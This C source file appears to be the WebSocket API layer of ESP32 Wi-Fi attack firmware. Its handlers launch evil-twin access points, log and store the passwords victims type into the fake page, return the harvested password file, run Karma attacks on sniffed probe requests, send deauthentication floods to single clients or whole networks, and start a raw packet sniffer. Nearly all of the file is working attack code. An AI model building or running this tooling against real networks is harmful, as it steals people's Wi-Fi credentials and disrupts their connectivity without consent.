#include <string.h>
#include <esp_timer.h>
#include <esp_log.h>
#include <cJSON.h>
#include <stdarg.h>
#include "utils.h"
#include "config.h"
#include "evil_twin.h"
#include "karma_attack.h"
#include "server_api.h"
#include "passwordMng.h"
#include "vendors.h"
#include "target.h"
#include "nvs_keys.h"
#include "deauther.h"

static const char *TAG = "SERVER_API";

typedef struct {
    api_commant_t cmd;
    esp_err_t (*handler)(ws_frame_req_t *req);
} api_cmd_t;


const char* mime_from_path(const char* path) {
    if (strstr(path, ".html")) return "text/html";
    if (strstr(path, ".css"))  return "text/css";
    if (strstr(path, ".js"))   return "application/javascript";
    if (strstr(path, ".png"))  return "image/png";
    if (strstr(path, ".jpg"))  return "image/jpeg";
    if (strstr(path, ".ico"))  return "image/x-icon";
    if (strstr(path, ".svg"))  return "image/svg+xml";
    return "text/plain";
}


static void shutdown_task(void *pvParameter)
{
    vTaskDelay(pdMS_TO_TICKS(1000));
    evil_twin_stop_attack();

    /* Enter in deep sleep to preserve battery power */
    /* Only hardware wakeup (Reset button) */
    //esp_deep_sleep_start();

    vTaskDelete(NULL);
}


static void api_send_status_frame(ws_frame_req_t *req, const char* status, const char *message)
{
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "status", status);
    cJSON_AddStringToObject(root, "message", message);

    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(payload);
    }
}


static esp_err_t api_get_status(ws_frame_req_t *req)
{
    int64_t time_us = esp_timer_get_time();
    int64_t time_s = time_us / 1000000;
    int hours = time_s / 3600;
    int minutes = (time_s % 3600) / 60;
    int seconds = time_s % 60;
    char uptime_str[16];
    snprintf(uptime_str, sizeof(uptime_str), "%02d:%02d:%02d", hours, minutes, seconds);

    /* Get RAM Usage percentage */
    size_t total_ram = heap_caps_get_total_size(MALLOC_CAP_DEFAULT);
    size_t free_ram = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
    int ram_usage = 0;
    if (total_ram > 0) {
        ram_usage = 100 - ((free_ram * 100) / total_ram);
    }

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        return ESP_FAIL;
    }
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_status");
    cJSON_AddStringToObject(root, "uptime", uptime_str);
    cJSON_AddNumberToObject(root, "ram", ram_usage);
    cJSON_AddNumberToObject(root, "packets", 0);
    cJSON_AddBoolToObject(root, "sd", false);
    bool attack_running = false;
    cJSON_AddBoolToObject(root, "evil_twin_running", attack_running);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (json_response == NULL) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_admin_get_ap_settings(ws_frame_req_t *req) 
{
    char ssid[32] = {0};
    char password[64] = {0};
    int32_t channel = 1;

    /* Read value from flash */
    if( read_string_from_flash("wifi_ssid", ssid) != ESP_OK )
    {
        strcpy(ssid, DEFAULT_WIFI_SSID);
    }
    if( read_string_from_flash("wifi_pass", password) != ESP_OK )
    {
        strcpy(password, DEFAULT_WIFI_PASS);
    }
    if( read_int_from_flash("wifi_chan", &channel) != ESP_OK )
    {
        channel = DEFAULT_WIFI_CHAN;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_ap_settings");
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    cJSON_AddNumberToObject(root, "channel", channel);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_admin_set_ap_settings(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        ESP_LOGE(TAG, "Invalid JSON received: %s", req->payload);
        return ESP_FAIL;
    }
    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");
    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(json, "channel");

    char ssid[32] = {0};
    char password[64] = {0};
    int channel = 1;

    if (cJSON_IsString(j_ssid)) {
        strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
    }
    if (cJSON_IsString(j_password)) {
        strlcpy(password, j_password->valuestring, sizeof(password));
    }
    if (cJSON_IsNumber(j_channel)) {
        channel = j_channel->valueint;
    }
    cJSON_Delete(json);

    save_string_to_flash(WIFI_SSID_KEY, (const char *)ssid);
    save_string_to_flash(WIFI_PASS_KEY, (const char *)password);
    save_int_to_flash(WIFI_CHAN_KEY, channel);

    api_send_status_frame(req, "ok", "AP settings saved successfully.");

    return ESP_OK;
}


static esp_err_t api_wifi_scan(ws_frame_req_t *req)
{
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
        .home_chan_dwell_time = 100,
    };

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.frame_type = WS_TX_FRAME;

    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to start scan");
        return err;
    }

    uint16_t ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&ap_count);
    if (err != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to get AP count");
        return err;
    }

    wifi_ap_record_t *ap_records = NULL;
    if (ap_count > 0) {
        ap_records = (wifi_ap_record_t *)calloc(ap_count, sizeof(wifi_ap_record_t));
        if (!ap_records) {
            api_send_status_frame(req, "error", "Out of memory");
            return ESP_ERR_NO_MEM;
        }

        err = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        if (err != ESP_OK) {
            free(ap_records);
            api_send_status_frame(req, "error", "Failed to get AP records");
            return err;
        }
    }

    cJSON *response_obj = cJSON_CreateObject();
    cJSON_AddNumberToObject(response_obj, "req_id", req->req_id);
    cJSON_AddStringToObject(response_obj, "type", "scan_result");

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        free(ap_records);
        api_send_status_frame(req, "error", "cJSON_CreateArray failed");
        return ESP_ERR_NO_MEM;
    }

    for (int i = 0; i < ap_count; i++) {
        char ssid[33];
        memcpy(ssid, ap_records[i].ssid, sizeof(ap_records[i].ssid));
        ssid[32] = '\0';

        char bssid[18];
        snprintf(bssid, sizeof(bssid),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                 ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5]);

        cJSON *obj = cJSON_CreateObject();
        if (!obj) {
            cJSON_Delete(root);
            free(ap_records);
            api_send_status_frame(req, "error", "cJSON_CreateObject failed");
            return ESP_ERR_NO_MEM;
        }

        cJSON_AddStringToObject(obj, "ssid", ssid);
        cJSON_AddNumberToObject(obj, "signal", ap_records[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", ap_records[i].primary);
        cJSON_AddStringToObject(obj, "bssid", bssid);
        cJSON_AddStringToObject(obj, "authmode", authmode_to_str(ap_records[i].authmode));
        cJSON_AddNumberToObject(obj, "authmode_code", ap_records[i].authmode);
        cJSON_AddNumberToObject(obj, "pairwise_cipher", ap_records[i].pairwise_cipher);
        cJSON_AddNumberToObject(obj, "group_cipher", ap_records[i].group_cipher);
        cJSON_AddBoolToObject(obj, "wps", ap_records[i].wps ? 1 : 0);
        cJSON_AddItemToArray(root, obj);
    }
    cJSON_AddItemToObject(response_obj, "data", root);

    char *json = cJSON_PrintUnformatted(response_obj);
    if (ap_records) free(ap_records);
    cJSON_Delete(response_obj);

    if (!json) {
        return ESP_ERR_NO_MEM;
    }

    cmd.payload = json; 
    cmd.len = strlen(json);
    cmd.need_free = true;

    if(ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json);
        ESP_LOGE(TAG, "Queue full");
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_start_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = { 0 };

    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_rssi = cJSON_GetObjectItemCaseSensitive(json, "signal");
    cJSON *j_auth = cJSON_GetObjectItemCaseSensitive(json, "authmode_code");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_rssi)) target_info.rssi = (int8_t)j_rssi->valueint;
    if (cJSON_IsNumber(j_auth)) target_info.authmode = (wifi_auth_mode_t)j_auth->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Evil Twin on SSID: %s (Ch: %d)", target_info.ssid, target_info.channel);
    evil_twin_start_attack(&target_info);

    api_send_status_frame(req, "ok", "Evil Twin Started");
    return ESP_OK;
}


static esp_err_t api_stop_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    evil_twin_stop_attack();
    api_send_status_frame(req, "ok", "Evil Twin Attack Stopped");
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_evlitwin_target(ws_frame_req_t *req)
{
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);

    char path[64];
    strlcpy(path, "/logo/", sizeof(path));
    strlcat(path, vendorToString(target->vendor), sizeof(path));
    strlcat(path, ".png", sizeof(path));

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "eviltwin_target");
    cJSON_AddStringToObject(root, "logo", path);
    cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
    cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        free(json_response);
        return ESP_FAIL;
    }
    return ESP_OK;
}


static esp_err_t api_check_input_password(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_pass = cJSON_GetObjectItemCaseSensitive(json, "password");
    if (!cJSON_IsString(j_pass)) {
        cJSON_Delete(json);
        api_send_status_frame(req, "error", "Missing password");
        return ESP_FAIL;
    }

    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    char buffer[256] = { 0 };
    snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", 
             (const char *)target->ssid, 
             target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], 
             j_pass->valuestring);
    
    password_manager_save(buffer);
    ESP_LOGI(TAG, "Captured: %s", buffer);

    bool correct = evil_twin_check_password(j_pass->valuestring);
    cJSON_Delete(json);

    if (correct) {
        api_send_status_frame(req, "ok", "Password Correct");
        xTaskCreate(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
    } else {
        api_send_status_frame(req, "bad", "Password Incorrect");
    }
    return ESP_OK;
}


static esp_err_t api_get_passwords(ws_frame_req_t *req)
{
    FILE *f = fopen(PASSWORD_FILE, "r");
    char *file_content = NULL;
    long length = 0;

    if (f) {
        fseek(f, 0, SEEK_END);
        length = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (length > 0) {
            file_content = malloc(length + 1);
            if (file_content) {
                fread(file_content, 1, length, f);
                file_content[length] = '\0';
            }
        }
        fclose(f);
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "passwords");
    cJSON_AddStringToObject(root, "content", file_content ? file_content : "");

    if (file_content) free(file_content);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;
    ws_send_command_to_queue(&cmd);

    return ESP_OK;
}


static esp_err_t api_karma_scan(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_act = cJSON_GetObjectItemCaseSensitive(json, "start_stop"); // 1 or 0
    if (cJSON_IsNumber(j_act)) {
        if (j_act->valueint == 1) {
            karma_attack_probes_scan_start();
            api_send_status_frame(req, "ok", "Karma Scan Started");
        } else {
            karma_attack_probes_scan_stop();
            api_send_status_frame(req, "ok", "Karma Scan Stopped");
        }
    }
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_karma_probes(ws_frame_req_t *req)
{
    const probe_request_list_t *list = wifi_sniffer_get_captured_probes();
    
    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "karma_probes");
    
    cJSON *arr = cJSON_CreateArray();
    if (list) {
        for (int i = 0; i < list->num_probes; i++) {
            cJSON *item = cJSON_CreateObject();
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                     list->probes[i].mac[0], list->probes[i].mac[1], list->probes[i].mac[2],
                     list->probes[i].mac[3], list->probes[i].mac[4], list->probes[i].mac[5]);

            cJSON_AddStringToObject(item, "mac", mac_str);
            cJSON_AddStringToObject(item, "ssid", list->probes[i].ssid);
            cJSON_AddNumberToObject(item, "rssi", list->probes[i].rssi);
            cJSON_AddNumberToObject(item, "channel", list->probes[i].channel);
            cJSON_AddItemToArray(arr, item);
        }
    }
    cJSON_AddItemToObject(root, "data", arr);

    char *json = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json;
    cmd.len = strlen(json);
    cmd.need_free = true;
    ws_send_command_to_queue(&cmd);

    return ESP_OK;
}


static esp_err_t api_karma_set_target(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;

    target_info_t target_info = { 0 };
    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    cJSON_Delete(json);

    karma_attack_set_target(&target_info);
    api_send_status_frame(req, "ok", "Karma Attack Started");
    return ESP_OK;
}


static esp_err_t api_deauther_start(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = {0};
    deauther_attack_type_t attack_type = DEAUTHER_ATTACK_DEAUTH_FRAME;
    deauther_attack_mode_t attack_mode = DEAUTHER_TARGET_UNICAST;
    cJSON *j_ssid = cJSON_GetObjectItem(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItem(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
    cJSON *j_mode = cJSON_GetObjectItem(json, "mode");
    cJSON *j_type = cJSON_GetObjectItem(json, "packet_type");

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_type)) attack_type = (deauther_attack_type_t)j_type->valueint;

    if (cJSON_IsString(j_mode) && strcmp(j_mode->valuestring, "broadcast") == 0) {
        attack_mode = DEAUTHER_TARGET_ALL;
    } else {
        attack_mode = DEAUTHER_TARGET_UNICAST;
    }
    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Deauth: Type=%d, Broadcast=%d", attack_type, attack_mode);
    deauther_start(&target_info, attack_type);

    api_send_status_frame(req, "ok", "Deauth Attack Started");
    return ESP_OK;
}


static esp_err_t api_deauther_stop(ws_frame_req_t *req)
{
    deauther_stop();
    ESP_LOGI(TAG, "Stopping Deauth Attack...");
    api_send_status_frame(req, "ok", "Deauth Attack Stopped");
    return ESP_OK;
}


static esp_err_t api_start_raw_sniffer(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    int channel = 1;
    bool hopping = false;
    int type = 0;
    uint32_t subtype = 0;

    if(json) {
        // Estrai parametri dal JSON
        cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
        cJSON *j_hop = cJSON_GetObjectItem(json, "hopping");
        cJSON *j_type = cJSON_GetObjectItem(json, "type");
        cJSON *j_sub = cJSON_GetObjectItem(json, "subtype");

        if(j_chan) channel = j_chan->valueint;
        if(j_hop) hopping = cJSON_IsTrue(j_hop);
        if(j_type) type = j_type->valueint;
        
        // Usa valuedouble per sicurezza con numeri grandi (0xFFFFFFFF) in JSON
        if(j_sub) subtype = (uint32_t)j_sub->valuedouble; 
        
        cJSON_Delete(json);
    }

    // 2. Avvia Sniffer in modalità RAW
    // Passiamo NULL come target perché in RAW mode vogliamo vedere tutto
    wifi_start_sniffing(NULL, SNIFF_MODE_RAW_VIEW);

    // 3. Gestione Canale / Hopping
    if (hopping) {
        wifi_sniffer_set_fine_filter(type, subtype, 0);
        wifi_sniffer_start_channel_hopping(0); 
    } else {
        wifi_sniffer_set_fine_filter(type, subtype, channel);
        wifi_sniffer_start_channel_hopping(channel);
    }
    
    api_send_status_frame(req, "ok", "Sniffer Started");
    return ESP_OK;
}


static esp_err_t api_stop_raw_sniffer(ws_frame_req_t *req)
{
    wifi_stop_sniffing();
    api_send_status_frame(req, "ok", "Sniffer Stopped");
    return ESP_OK;
}


static const api_cmd_t api_cmd_list[] = {
    { API_GET_STATUS, api_get_status },
    { API_SET_AP_SETTINGS, api_admin_set_ap_settings },
    { API_GET_AP_SETTINGS, api_admin_get_ap_settings },
    { API_WIFI_SCAN, api_wifi_scan },
    { API_START_EVILTWIN, api_start_evil_twin },
    { API_STOP_EVILTWIN, api_stop_evil_twin },
    { API_GET_EVILTWIN_TARGET, api_get_evlitwin_target },
    { API_CHECK_INPUT_PASSWORD, api_check_input_password },
    { API_GET_PASSWORDS, api_get_passwords },
    { API_KARMA_ATTACK_SCAN, api_karma_scan },
    { API_GET_KARMA_PROBES, api_get_karma_probes },
    { API_KARMA_ATTACK_START, api_karma_set_target },
    { API_DEAUTHER_START, api_deauther_start },
    { API_DEAUTHER_STOP, api_deauther_stop },
    { API_START_RAW_SNIFFER, api_start_raw_sniffer },
    { API_STOP_RAW_SNIFFER, api_stop_raw_sniffer }
};


void http_api_parse(ws_frame_req_t *req)
{
    cJSON *root = cJSON_Parse(req->payload);
    if (root == NULL) {
        ESP_LOGE(TAG, "Invalid JSON received: %s", req->payload);
        return;
    }

    cJSON *jcmd = cJSON_GetObjectItemCaseSensitive(root, "cmd");
    if (!cJSON_IsNumber(jcmd)) {
        ESP_LOGE(TAG, "Missing/invalid cmd");
        cJSON_Delete(root);
        return;
    }

    cJSON *jid = cJSON_GetObjectItemCaseSensitive(root, "req_id");
    if (cJSON_IsNumber(jid)) {
        req->req_id = jid->valueint; 
    } else {
        req->req_id = 0;
    }

    int cmd = jcmd->valueint;
    bool handled = false;
    for (size_t i = 0; i < sizeof(api_cmd_list) / sizeof(api_cmd_t); i++) {
        if (api_cmd_list[i].cmd == cmd) {
            api_cmd_list[i].handler(req);
            handled = true;
            break;
        }
    }

    if (!handled) {
        ESP_LOGW(TAG, "Unknown command: %d", cmd);
        api_send_status_frame(req, "error", "Unknown command");
    }

    cJSON_Delete(root);
}


void ws_log(const char *level, const char *format, ...)
{
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddStringToObject(root, "type", "log");
    cJSON_AddStringToObject(root, "level", level);
    cJSON_AddStringToObject(root, "msg", buffer);
    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = get_web_server_handle(); 
    cmd.fd = -1; //BROADCAST
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_broadcast_to_queue(&cmd) != ESP_OK) {
        free(payload);
    }
}